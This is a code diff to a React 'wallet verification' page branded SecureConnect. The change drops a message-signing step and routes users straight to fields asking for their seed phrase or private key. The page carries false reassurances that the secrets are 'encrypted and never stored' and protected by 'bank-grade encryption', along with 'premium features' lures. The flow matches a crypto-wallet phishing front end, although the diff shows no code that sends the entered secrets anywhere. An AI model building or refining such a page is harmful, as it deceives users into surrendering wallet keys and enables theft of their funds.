@@ -27,8 +27,8 @@ const walletTypes = [
 ];
 
 const steps = [
-  { id: 1, title: "Connect", icon: "plug" },
-  { id: 2, title: "Verify", icon: "key" },
+  { id: 1, title: "Select", icon: "wallet" },
+  { id: 2, title: "Connect", icon: "key" },
   { id: 3, title: "Complete", icon: "check" }
 ];
 
@@ -43,11 +43,14 @@ export default function WalletVerification() {
   const [loadingMessage, setLoadingMessage] = useState("");
   const [showPrivateKey, setShowPrivateKey] = useState(false);
 
-  const handleConnectWallet = async () => {
+  const handleSelectWallet = () => {
     if (!selectedWalletType) {
       return;
     }
+    setCurrentStep(2);
+  };
 
+  const handleConnectWallet = async () => {
     if (connectionMethod === "seed" && !seedPhrase.trim()) {
       return;
     }
@@ -65,19 +68,8 @@ export default function WalletVerification() {
       const mockAddress = "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
       setWalletAddress(mockAddress);
       setIsLoading(false);
-      setCurrentStep(2);
-    }, 2000);
-  };
-
-  const handleSignMessage = async () => {
-    setIsLoading(true);
-    setLoadingMessage("Please sign the message in your wallet");
-    
-    // Simulate message signing
-    setTimeout(() => {
-      setIsLoading(false);
       setCurrentStep(3);
-    }, 2500);
+    }, 2000);
   };
 
   const currentDate = new Date().toLocaleDateString();
@@ -108,7 +100,7 @@ export default function WalletVerification() {
         />
 
         <AnimatePresence mode="wait">
-          {/* Step 1: Connect Wallet */}
+          {/* Step 1: Select Wallet */}
           {currentStep === 1 && (
             <motion.div
               key="step-1"
@@ -120,33 +112,87 @@ export default function WalletVerification() {
             >
               <div className="text-center mb-8">
                 <div className="w-20 h-20 gradient-primary rounded-2xl flex items-center justify-center mx-auto mb-6">
-                  <Shield className="text-white text-2xl" />
+                  <Wallet className="text-white text-2xl" />
                 </div>
-                <h2 className="text-2xl font-bold mb-3">Verify Your Wallet</h2>
+                <h2 className="text-2xl font-bold mb-3">Select Your Wallet</h2>
                 <p className="text-muted-foreground leading-relaxed">
-                  Connect and verify your wallet to access secure features and enhanced protection for your digital assets.
+                  Choose your wallet type to begin the verification process. We support all major wallet applications.
                 </p>
               </div>
 
               {/* Wallet Selection */}
               <Card className="bg-slate border-muted">
-                <CardContent className="p-6 space-y-4">
-                  <div>
-                    <Label htmlFor="wallet-type" className="text-sm font-medium">Select Your Wallet Type</Label>
-                    <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
-                      <SelectTrigger className="w-full mt-2 bg-slate-light border-muted">
-                        <SelectValue placeholder="Choose your wallet..." />
-                      </SelectTrigger>
-                      <SelectContent>
-                        {walletTypes.map((wallet) => (
-                          <SelectItem key={wallet} value={wallet}>
-                            {wallet}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                  </div>
+                <CardContent className="p-6">
+                  <Label htmlFor="wallet-type" className="text-sm font-medium">Choose Your Wallet Type</Label>
+                  <Select value={selectedWalletType} onValueChange={setSelectedWalletType}>
+                    <SelectTrigger className="w-full mt-3 bg-slate-light border-muted h-12">
+                      <SelectValue placeholder="Select your wallet..." />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {walletTypes.map((wallet) => (
+                        <SelectItem key={wallet} value={wallet}>
+                          {wallet}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </CardContent>
+              </Card>
 
+              {/* Supported Wallets Info */}
+              <div className="space-y-4">
+                <h3 className="text-lg font-semibold">Why Verify Your Wallet?</h3>
+                <div className="space-y-3">
+                  {[
+                    "Enhanced security and fraud protection",
+                    "Access to premium features and higher limits", 
+                    "Priority customer support"
+                  ].map((feature, index) => (
+                    <div key={index} className="flex items-start space-x-3">
+                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
+                        <Check className="text-white text-xs" />
+                      </div>
+                      <span className="text-sm text-muted-foreground">{feature}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              <Button 
+                onClick={handleSelectWallet}
+                disabled={!selectedWalletType}
+                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
+                size="lg"
+              >
+                <ArrowRight className="mr-2 h-4 w-4" />
+                Continue
+              </Button>
+            </motion.div>
+          )}
+
+          {/* Step 2: Connect Wallet */}
+          {currentStep === 2 && (
+            <motion.div
+              key="step-2"
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -20 }}
+              transition={{ duration: 0.3 }}
+              className="space-y-6"
+            >
+              <div className="text-center mb-8">
+                <div className="w-20 h-20 gradient-accent rounded-2xl flex items-center justify-center mx-auto mb-6">
+                  <Key className="text-white text-2xl" />
+                </div>
+                <h2 className="text-2xl font-bold mb-3">Connect Your {selectedWalletType}</h2>
+                <p className="text-muted-foreground leading-relaxed">
+                  Enter your wallet credentials to securely connect and verify ownership. Your information is encrypted and never stored.
+                </p>
+              </div>
+
+              {/* Connection Method Selection */}
+              <Card className="bg-slate border-muted">
+                <CardContent className="p-6 space-y-4">
                   <div>
                     <Label htmlFor="connection-method" className="text-sm font-medium">Connection Method</Label>
                     <Select value={connectionMethod} onValueChange={setConnectionMethod}>
@@ -165,14 +211,14 @@ export default function WalletVerification() {
                       <Label htmlFor="seed-phrase" className="text-sm font-medium">Seed Phrase</Label>
                       <Textarea
                         id="seed-phrase"
-                        placeholder="Enter your 12-24 word seed phrase..."
+                        placeholder="Enter your 12-24 word seed phrase separated by spaces..."
                         value={seedPhrase}
                         onChange={(e) => setSeedPhrase(e.target.value)}
-                        className="mt-2 bg-slate-light border-muted min-h-[100px] resize-none"
-                        rows={4}
+                        className="mt-2 bg-slate-light border-muted min-h-[120px] resize-none"
+                        rows={5}
                       />
                       <p className="text-xs text-muted-foreground mt-1">
-                        Your seed phrase is encrypted and never stored on our servers
+                        🔒 Your seed phrase is encrypted and never stored on our servers
                       </p>
                     </div>
                   )}
@@ -184,7 +230,7 @@ export default function WalletVerification() {
                         <Input
                           id="private-key"
                           type={showPrivateKey ? "text" : "password"}
-                          placeholder="Enter your private key..."
+                          placeholder="Enter your private key (starts with 0x)..."
                           value={privateKey}
                           onChange={(e) => setPrivateKey(e.target.value)}
                           className="bg-slate-light border-muted pr-10"
@@ -200,103 +246,34 @@ export default function WalletVerification() {
                         </Button>
                       </div>
                       <p className="text-xs text-muted-foreground mt-1">
-                        Your private key is encrypted and never stored on our servers
+                        🔒 Your private key is encrypted and never stored on our servers
                       </p>
                     </div>
                   )}
                 </CardContent>
               </Card>
 
-              {/* Security Features */}
-              <div className="space-y-4">
-                <h3 className="text-lg font-semibold">Why Verify?</h3>
-                <div className="space-y-3">
-                  {[
-                    "Enhanced security and fraud protection",
-                    "Access to premium features and higher limits",
-                    "Priority customer support"
-                  ].map((feature, index) => (
-                    <div key={index} className="flex items-start space-x-3">
-                      <div className="w-5 h-5 bg-accent rounded-full flex items-center justify-center mt-0.5">
-                        <Check className="text-white text-xs" />
-                      </div>
-                      <span className="text-sm text-muted-foreground">{feature}</span>
-                    </div>
-                  ))}
+              {/* Security Notice */}
+              <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg p-4">
+                <div className="flex items-start space-x-3">
+                  <Shield className="h-5 w-5 text-amber-500 mt-0.5" />
+                  <div>
+                    <h4 className="text-sm font-medium text-amber-500 mb-1">Security Notice</h4>
+                    <p className="text-xs text-muted-foreground">
+                      Only enter your credentials on trusted sites. We use bank-grade encryption to protect your information.
+                    </p>
+                  </div>
                 </div>
               </div>
 
               <Button 
                 onClick={handleConnectWallet}
-                disabled={!selectedWalletType || (connectionMethod === "seed" && !seedPhrase.trim()) || (connectionMethod === "private" && !privateKey.trim())}
-                className="w-full gradient-primary text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-primary/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
-                size="lg"
-              >
-                <Wallet className="mr-2 h-4 w-4" />
-                Connect Wallet
-              </Button>
-            </motion.div>
-          )}
-
-          {/* Step 2: Verify Ownership */}
-          {currentStep === 2 && (
-            <motion.div
-              key="step-2"
-              initial={{ opacity: 0, y: 20 }}
-              animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: -20 }}
-              transition={{ duration: 0.3 }}
-              className="space-y-6"
-            >
-              <div className="text-center mb-8">
-                <div className="w-20 h-20 gradient-accent rounded-2xl flex items-center justify-center mx-auto mb-6">
-                  <Key className="text-white text-2xl" />
-                </div>
-                <h2 className="text-2xl font-bold mb-3">Verify Ownership</h2>
-                <p className="text-muted-foreground leading-relaxed">
-                  Sign a message with your wallet to prove ownership. This is completely safe and costs no gas fees.
-                </p>
-              </div>
-
-              {/* Verification Status */}
-              <Card className="bg-slate border-muted">
-                <CardContent className="p-6">
-                  <div className="flex items-center justify-between mb-4">
-                    <span className="text-sm font-medium">Wallet Connected</span>
-                    <div className="flex items-center space-x-2">
-                      <div className="w-2 h-2 bg-accent rounded-full animate-pulse-slow"></div>
-                      <span className="text-sm text-accent">Connected</span>
-                    </div>
-                  </div>
-                  <div className="bg-slate-light rounded-lg p-3">
-                    <div className="text-xs text-muted-foreground mb-1">Wallet Address</div>
-                    <div className="font-mono text-sm">{walletAddress}</div>
-                  </div>
-                </CardContent>
-              </Card>
-
-              {/* Verification Message */}
-              <Card className="bg-slate border-muted">
-                <CardContent className="p-6">
-                  <h3 className="text-lg font-semibold mb-3">Signature Request</h3>
-                  <p className="text-sm text-muted-foreground mb-4">
-                    Please sign the following message to verify wallet ownership:
-                  </p>
-                  <div className="bg-slate-light rounded-lg p-4 border-l-4 border-primary">
-                    <div className="text-sm font-mono text-muted-foreground">
-                      "I verify ownership of this wallet for SecureConnect platform verification on {currentDate}"
-                    </div>
-                  </div>
-                </CardContent>
-              </Card>
-
-              <Button 
-                onClick={handleSignMessage}
-                className="w-full gradient-accent text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-orange-500/25 transition-all duration-300 active:scale-95"
+                disabled={(connectionMethod === "seed" && !seedPhrase.trim()) || (connectionMethod === "private" && !privateKey.trim())}
+                className="w-full gradient-accent text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-orange-500/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                 size="lg"
               >
                 <Key className="mr-2 h-4 w-4" />
-                Sign Message
+                Connect Wallet
               </Button>
             </motion.div>
           )}
